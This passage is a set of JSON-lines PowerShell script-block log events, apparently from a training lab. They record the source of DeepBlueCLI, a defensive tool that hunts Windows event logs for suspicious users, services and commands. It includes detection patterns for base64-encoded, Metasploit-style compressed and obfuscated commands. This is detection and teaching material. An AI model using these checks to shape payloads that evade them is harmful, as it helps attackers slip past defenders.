\"`n\"\r\n        Write-Host \"Exiting...`n\"\r\n        exit\r\n    }\r\n    ForEach ($event in $events) {\r\n        $output=\"\" # Final output text string\r\n        $eventXML = [xml]$event.ToXml()\r\n        if ($logname -eq \"Security\"){\r\n            if ($event.id -eq 4688){\r\n                # A new process has been created. (Command Line Logging)\r\n                $commandline=$eventXML.Event.EventData.Data[8].\"#text\"\r\n                $output += (Check-Command $commandline $minlength $regexes $whitelist 0)\r\n            }\r\n            ElseIf ($event.id -eq 4720){ \r\n                # A user account was created.\r\n                $username=$eventXML.Event.EventData.Data[0].\"#text\"\r\n                $securityid=$eventXML.Event.EventData.Data[2].\"#text\"\r\n                $output += \"  New user created: $username`n\"\r\n                $output += \"    - User SID: $securityid`n\"\r\n            }\r\n            ElseIf(($event.id -eq 4728) -or ($event.id -eq 4732)){\r\n                # A member was added to a security-enabled (global|local) group.\r\n                $groupname=$eventXML.Event.EventData.Data[2].\"#text\"\r\n                # Check if group is Administrators, may later expand to all groups\r\n                if ($groupname -eq \"Administrators\"){    \r\n                    $username=$eventXML.Event.EventData.Data[0].\"#text\"\r\n                    $securityid=$eventXML.Event.EventData.Data[1].\"#text\"\r\n                    switch ($event.id){\r\n                        4728 {$output += \"  User added to global $groupname group`n\"}\r\n                        4732 {$output += \"  User added to local $groupname group`n\"}\r\n                    }\r\n                    $output += \"    - Username: $username`n\"\r\n                    $output += \"    - User SID: $securityid`n\"\r\n                }\r\n            }\r\n            ElseIf($event.id -eq 4625){\r\n                # An account failed to log on.\r\n                # Requires auditing logon failures\r\n                # https://technet.microsoft.com/en-us/library/cc976395.aspx\r\n                $username=$eventXML.Event.EventData.Data[5].\"#text\"\r\n                $failedlogons += 1\r\n            }\r\n        }\r\n        ElseIf ($logname -eq \"System\"){\r\n            if ($event.id -eq 7045){\r\n                # A service was installed in the system.\r\n                $servicename=$eventXML.Event.EventData.Data[0].\"#text\"\r\n                # Check for suspicious service name\r\n                $text = (Check-Regex $servicename $regexes 1)\r\n                if ($text){\r\n                    $output += \"  Service created, service name: $servicename`n\"\r\n                    $output += $text\r\n                }\r\n                # Check for suspicious cmd\r\n                $commandline=$eventXML.Event.EventData.Data[1].\"#text\"\r\n                $output += (Check-Command $commandline $minlength $regexes $whitelist 1)\r\n            }\r\n            ElseIf ($event.id -eq 7030){\r\n                # The ... service is marked as an interactive service.  However, the system is configured \r\n                # to not allow interactive services.  This service may not function properly.\r\n                $servicename=$eventXML.Event.EventData.Data.\"#text\"\r\n                $output += \"  Interactive service warning, service name: $servicename`n\"\r\n                # Check for suspicious service name\r\n                $output += (Check-Regex $servicename $regexes 1)\r\n            }\r\n            ElseIf ($event.id -eq 7036){\r\n                # The ... service entered the stopped|running state.\r\n                $servicename=$eventXML.Event.EventData.Data[0].\"#text\"\r\n                $text = (Check-Regex $servicename $regexes 1)\r\n                if ($text){\r\n                    $output += \"  \" + $event.Message + \"`n\"\r\n                    $output += $text\r\n                }\r\n            }\r\n        } \r\n        ElseIf ($logname -eq \"Application\"){\r\n            if (($event.id -eq 2) -and ($event.Providername -eq \"EMET\")){\r\n                # EMET Block\r\n                $output += \"  EMET Block`n\"\r\n                if ($event.Message){ \r\n                    # EMET Message is a blob of text that looks like this:\r\n                    #########################################################\r\n                    # EMET detected HeapSpray mitigation and will close the application: iexplore.exe\r\n                    #\r\n                    # HeapSpray check failed:\r\n                    #   Application   : C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\r\n                    #   User Name     : WIN-CV6AHH1BNU9\\Instructor\r\n                    #   Session ID    : 1\r\n                    #   PID           : 0xBA8 (2984)\r\n                    #   TID           : 0x9E8 (2536)\r\n                    #   Module        : mshtml.dll\r\n                    #  Address       : 0x6FBA7512, pull out relevant parts\r\n                    $array = $event.message -split '\\n' # Split each line of the message into an array\r\n                    $message = $array[0]\r\n                    $application = Remove-Spaces($array[3])\r\n                    $username = Remove-Spaces($array[4])\r\n                    $output += \"  - Message: $message`n\"\r\n                    $output += \"  - $application`n\"\r\n                    $output += \"  - $username`n\" \r\n                }\r\n                Else{\r\n                    # If the message is blank: EMET is not installed locally.\r\n                    # This occurs when parsing remote event logs sent from systems with EMET installed\r\n                    $output += \"  Warning: EMET Message field is blank. Install EMET locally to see full details of this alert\"\r\n                }\r\n            }\r\n        }  \r\n        ElseIf ($logname -eq \"Applocker\"){\r\n            if ($event.id -eq 8004){ \r\n                # ...was prevented from running.\r\n                $output += \"  Applocker block: \" + $event.message\r\n            }\r\n        } \r\n        ElseIf ($logname -eq \"PowerShell\"){\r\n            #$event.pd\r\n            if ($event.id -eq 4103){\r\n                $pscommand= $eventXML.Event.EventData.Data[2].\"#text\"\r\n                if ($pscommand -Match \"Host Application\"){ \r\n                    # Multiline replace, remove everything before \"Host Application = \"\r\n                    $pscommand = $pscommand -Replace \"(?ms)^.*Host.Application = \",\"\"\r\n                    # Remove every line after the \"Host Application = \" line.\r\n                    $pscommand = $pscommand -Replace \"(?ms)`n.*$\",\"\"\r\n                    $output += (Check-Command $pscommand $minlength $regexes $whitelist 0)\r\n                }\r\n            }\r\n            # Ignoring PowerShell event 4014 for now, DeepBlueCLI currently detects its own strings, and hilarity ensues\r\n            ElseIf ($event.id -eq 4104){\r\n              # Check of MessageTotal == 1)\r\n              if ($eventxml.Event.EventData.Data[1].\"#text\" -eq 1){\r\n                  $eventxml.Event.EventData.Data[1].\"#text\"\r\n                  $pscommand=$eventXML.Event.EventData.Data[4].\"#text\"\r\n                  $output += (Check-Command $pscommand 9999 $regexes $whitelist 0)\r\n              }\r\n            }\r\n        }\r\n        ElseIf ($logname -eq \"Sysmon\"){\r\n        #@{logname=\"Microsoft-Windows-Sysmon/Operational\";id=1} | %{$_.Properties[11].Value}| sort -Unique\r\n        #get-winevent @{logname=\"Microsoft-Windows-Sysmon/Operational\";id=1} | % {$_.Properties[11].Value}| Sort-Object -unique\r\n        #Get-WinEvent @{logname=\"Microsoft-Windows-Sysmon/Operational\";id=7}|fl\r\n            # Check command lines\r\n            if ($event.id -eq 1){\r\n                #get-winevent @{logname=\"Microsoft-Windows-Sysmon/Operational\";id=1} | % {$_.Properties[4].Value}\r\n                $commandline=$eventXML.Event.EventData.Data[4].\"#text\"\r\n                # Remove \"Command Line: \" from the $commandline\r\n                #$commandline= $commandline -Replace \"^Command Line:\",\"\"\r\n                #$commandline\r\n                $output += (Check-Command $commandline $minlength $regexes $whitelist 0)\r\n            }\r\n            # Check for unsigned EXEs/DLLs:\r\n            ElseIf ($event.id -eq 7){\r\n                if ($eventXML.Event.EventData.Data[6].\"#text\" -eq \"false\"){\r\n                    $image=$eventXML.Event.EventData.Data[3].\"#text\"\r\n                    $imageload=$eventXML.Event.EventData.Data[4].\"#text\"\r\n                    $hash=$eventXML.Event.EventData.Data[5].\"#text\"\r\n                    $pscommand=  \"  - Image: \" + $image + \"`r`n\"\r\n                    $pscommand+= \"  - ImageLoaded: \" + $imageload + \"`r`n\"      \r\n                    #$pscommand+= \"  - Hash: \" + $hash + \"`r`n\"\r\n                    # Multiple hashes may be logged, we want SHA1. Remove everything through \"SHA1=\"\r\n                    $sha1= $hash -Replace \"(?ms)^.*SHA1=\",\"\"\r\n                    # Split the string on commas, grab field 0\r\n                    $sha1=$sha1.Split(\",\")[0]\r\n                    $hashfile=\".\\hashes\\$sha1\"\r\n                    if (-not (Test-Path $hashfile)){  \r\n                        # Hash file doesn't exist, create it\r\n                        $csv=$image+\",\"+$imageload\r\n                        $csv | Set-Content $hashfile\r\n                    }\r\n                    #$pscommand+= $eventXML.Event.EventData.Data[6].\"#text\" + \"`r`n\"\r\n                    #$pscommand+= $eventXML.Event.EventData.Data[7].\"#text\" + \"`r`n\"\r\n                    #$pscommand+= $eventXML.Event.EventData.Data[8].\"#text\" + \"`r`n\"\r\n                    $output+= \"  Unsigned image:`r`n\"\r\n                    $output+= $pscommand\r\n                 }\r\n             }\r\n        }\r\n        if ($output){\r\n            $event.TimeCreated \r\n            $output\r\n            \"\"\r\n        }\r\n    }\r\n    if ($failedlogons -gt $maxfailedlogons){\r\n         \"High number of failed logons in the security event log: \" + $failedlogons \r\n    }\r\n} \r\n\r\nfunction Check-Options($file, $log)\r\n{\r\n    $log_error=\"Unknown and/or unsupported log type\"\r\n    $logname=\"\"\r\n    # Checks the command line options, return logname to parse\r\n    if($file -eq \"\"){ # No filename provided, parse local logs\r\n        if(($log -eq \"\") -or ($log -eq \"Security\")){ # Parse the security log if no log was selected\r\n            $logname=\"Security\"\r\n        }\r\n        ElseIf ($log -eq \"System\"){\r\n            $logname=\"System\"\r\n        }\r\n        ElseIf ($log -eq \"Application\"){\r\n            $logname=\"Application\"\r\n        }\r\n        ElseIf ($log -eq \"Sysmon\"){\r\n            $logname=\"Sysmon\"\r\n        }\r\n            ElseIf ($log -eq \"Powershell\"){\r\n            $logname=\"Powershell\"\r\n        }\r\n        Else{\r\n            write-host $log_error\r\n            exit 1\r\n        }    \r\n    }\r\n    else{ # Filename provided, check if it exists:\r\n        if (Test-Path $file){ # File exists. Todo: verify it is an evtx file. \r\n            # Get-WinEvent will generate this error for non-evtx files: \"...file does not appear to be a valid log file. \r\n            # Specify only .evtx, .etl, or .evt filesas values of the Path parameter.\"\r\n            #\r\n            # Check the LogName of the first event\r\n            try{\r\n                $event=Get-WinEvent -path $file -max 1 -ErrorAction Stop\r\n            }\r\n            catch\r\n            {\r\n                Write-Host \"Get-WinEvent error: \" $_.Exception.Message \"`n\"\r\n                Write-Host \"Exiting...`n\"\r\n                exit\r\n            }\r\n            switch ($event.LogName){\r\n                \"Security\"    {$logname=\"Security\"}\r\n                \"System\"      {$logname=\"System\"}\r\n                \"Application\" {$logname=\"Application\"}\r\n                \"Microsoft-Windows-AppLocker*\"   {$logname=\"Applocker\"}\r\n                \"Microsoft-Windows-PowerShell/Operational\"   {$logname=\"Powershell\"}\r\n                \"Microsoft-Windows-Sysmon/Operational\"   {$logname=\"Sysmon\"}\r\n                default       {\"Logic error 3, should not reach here...\";Exit 1}\r\n            }\r\n        }\r\n        else{ # Filename does not exist, exit\r\n            Write-host \"Error: no such file. Exiting...\"\r\n            exit 1\r\n        }\r\n    }\r\n    return $logname\r\n}\r\n\r\nfunction Create-Filter($file, $logname)\r\n{\r\n    # Return the Get-Winevent filter \r\n    #\r\n    $sys_events=\"7030,7036,7045\"\r\n    $sec_events=\"4688,4720,4728,4732,4625\"\r\n    $app_events=\"2\"\r\n    $applocker_events=\"8003,8004,8006,8007\"\r\n    $powershell_events=\"4103,4104\"\r\n    $sysmon_events=\"1,7\"\r\n    if ($file -ne \"\"){\r\n        switch ($logname){\r\n            \"Security\"    {$filter=\"@{path=\"\"$file\"\";ID=$sec_events}\"}\r\n            \"System\"      {$filter=\"@{path=\"\"$file\"\";ID=$sys_events}\"}\r\n            \"Application\" {$filter=\"@{path=\"\"$file\"\";ID=$app_events}\"}\r\n            \"Applocker\"   {$filter=\"@{path=\"\"$file\"\";ID=$applocker_events}\"}\r\n            \"Powershell\"  {$filter=\"@{path=\"\"$file\"\";ID=$powershell_events}\"}\r\n            \"Sysmon\"      {$filter=\"@{path=\"\"$file\"\";ID=$sysmon_events}\"}\r\n            default       {\"Logic error 1, should not reach here...\";Exit 1}\r\n        }\r\n    }\r\n    else{\r\n        switch ($logname){\r\n            \"Security\"    {$filter=\"@{Logname=\"\"Security\"\";ID=$sec_events}\"}\r\n            \"System\"      {$filter=\"@{Logname=\"\"System\"\";ID=$sys_events}\"}\r\n            \"Application\" {$filter=\"@{Logname=\"\"Application\"\";ID=$app_events}\"}\r\n            \"Applocker\"   {$filter=\"@{logname=\"\"Microsoft-Windows-AppLocker\"\";ID=$applocker_events}\"}\r\n            \"Powershell\"  {$filter=\"@{logname=\"\"Microsoft-Windows-PowerShell/Operational\"\";ID=$powershell_events}\"}\r\n            \"Sysmon\"      {$filter=\"@{logname=\"\"Microsoft-Windows-Sysmon/Operational\"\";ID=$sysmon_events}\"}\r\n            default       {\"Logic error 2, should not reach here...\";Exit 1}\r\n        }\r\n    }\r\n    return $filter\r\n}\r\n\r\n\r\nfunction Check-Command($commandline,$minlength,$regexes,$whitelist,$servicecmd){\r\n    $text=\"\"\r\n    $base64=\"\"\r\n    # Check to see if command is whitelisted\r\n    foreach ($entry in $whitelist) {\r\n        if ($commandline -Match $entry.regex) {\r\n            # Command is whitelisted, return nothing\r\n            return\r\n        }\r\n    }\r\n    #$cmdlength=$commandline.length\r\n    #if ($cmdlength -gt $minlength){\r\n    if ($commandline.length -gt $minlength){\r\n        $text += \"   - Long Command Line: greater than $minlength bytes`n\"\r\n    }\r\n    $text += (Check-Obfu $commandline)\r\n    $text += (Check-Regex $commandline $regexes 0)\r\n    # Check for base64 encoded function, decode and print if found\r\n    # This section is highly use case specific, other methods of base64 encoding and/or compressing may evade these checks\r\n    if ($commandline -Match \"\\-enc.*[A-Za-z0-9/+=]{100}\"){\r\n        $base64= $commandline -Replace \"^.* \\-Enc(odedCommand)? \",\"\"\r\n    }\r\n    ElseIf ($commandline -Match \":FromBase64String\\(\"){\r\n        $base64 = $commandline -Replace \"^.*:FromBase64String\\(\\'*\",\"\"\r\n        $base64 = $base64 -Replace \"\\'.*$\",\"\"\r\n    }\r\n    if ($base64){\r\n        if ($commandline -Match \"Compression.GzipStream.*Decompress\"){\r\n            # Metasploit-style compressed and base64-encoded function. Uncompress it.\r\n            $decoded=New-Object IO.MemoryStream(,[Convert]::FromBase64String($base64))\r\n            $uncompressed=(New-Object IO.StreamReader(((New-Object IO.Compression.GzipStream($decoded,[IO.Compression.CompressionMode]::Decompress))),[Text.Encoding]::ASCII)).ReadToEnd()\r\n            $text += \"  Decoded/decompressed Base64:\" + $uncompressed \r\n            $text += \"   - Base64-encoded and compressed function`n\"\r\n        }\r\n        else{\r\n            $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64))\r\n            $text += \"  Decoded Base64:\" + $decoded + \"`n\"\r\n            $text += \"   - Base64-encoded function`n\"\r\n            $text += (Check-Obfu $decoded)\r\n            $text += (Check-Regex $decoded $regexes 0)\r\n            #foreach ($regex in $regexes){\r\n            #    if ($regex.Type -eq 0) { # Image Path match\r\n            #        if ($decoded -Match $regex.regex) {\r\n            #            $text += \"   - \" + $regex.String + \"`n\"\r\n            #        }\r\n            #    }\r\n            #}\r\n        }\r\n    }\r\n    if ($text){\r\n        if ($servicecmd){\r\n            return \"  Service File Name: $commandline`n\" + $text\r\n        }\r\n        Else{\r\n            return \"  Command Line: $commandline`n\" + $text\r\n        }\r\n    }\r\n    return \"\"\r\n}    \r\n\r\nfunction Check-Regex($string,$regexes,$type){\r\n    $regextext=\"\" # Local variable for return output\r\n    foreach ($regex in $regexes){\r\n        if ($regex.Type -eq $type) { # Type is 0 for Commands, 1 for services. Set in regexes.csv\r\n            if ($string -Match $regex.regex) {\r\n               $regextext += \"   - \" + $regex.String + \"`n\"\r\n            }\r\n        }\r\n    }\r\n    return $regextext\r\n}\r\n\r\nfunction Check-Obfu($string){\r\n    # Check how many special characters are in the command. Inspired by Invoke-Obfuscation: https://twitter.com/danielhbohannon/status/778268820242825216\r\n    # There are many ways to do this, including regex. Need a way that doesn't kill the CPU. This works, but isn't super concise. There is probably a\r\n    # better way.\r\n    # \r\n    $obfutext=\"\" # Local variable for return output\r\n    $maxchars=25\r\n    #$obfuchars = \"\\+\", \"\\'\", \"\\}\", \"\\{\"\r\n    #foreach ($char in $obfuchars){\r\n    #\r\n    # I tried to loop through the characters (as the two commented lines above show, but\r\n    # hit problems of variable interpolation. I am probably making a simple mistake.\r\n    # If you can get the above loop working, please email deepblue at backshore dot net. \r\n    # I will repay in an adult beverage \r\n    #\r\n    # In the meantime, this is ugly, but works\r\n    $string2 = $string -replace \"`'\"\r\n    # Compare ","ScriptBlockId":"c4c51741-5c5a-4df0-acc0-d639a3f79256","Path":"C:\\Users\\student\\Desktop\\DeepBlueCLI-master\\DeepBlue-0.2.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":3,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T16:40:20.569165Z"},"EventRecordID":572515,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-5E1A-71CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":2,"MessageTotal":2,"ScriptBlockText":"the length\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars ' characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`{\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars { characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`}\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars } characters`n\"\r\n    }\r\n    $string2 = $string -replace \",\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars , characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`\"\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars double quotes`n\"\r\n    }\r\n    return $obfutext\r\n    #}\r\n}\r\n\r\nfunction Remove-Spaces($string){\r\n    # Changes this:   Application       : C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\r\n    #      to this: Application: C:\\Program Files (x86)\\Internet Explorer\\iexplore.exe\r\n    $string = $string.trim() -Replace \"\\s+:\",\":\"\r\n    return $string\r\n}\r\n\r\n. Main\r\n\r\n","ScriptBlockId":"c4c51741-5c5a-4df0-acc0-d639a3f79256","Path":"C:\\Users\\student\\Desktop\\DeepBlueCLI-master\\DeepBlue-0.2.ps1"}}}
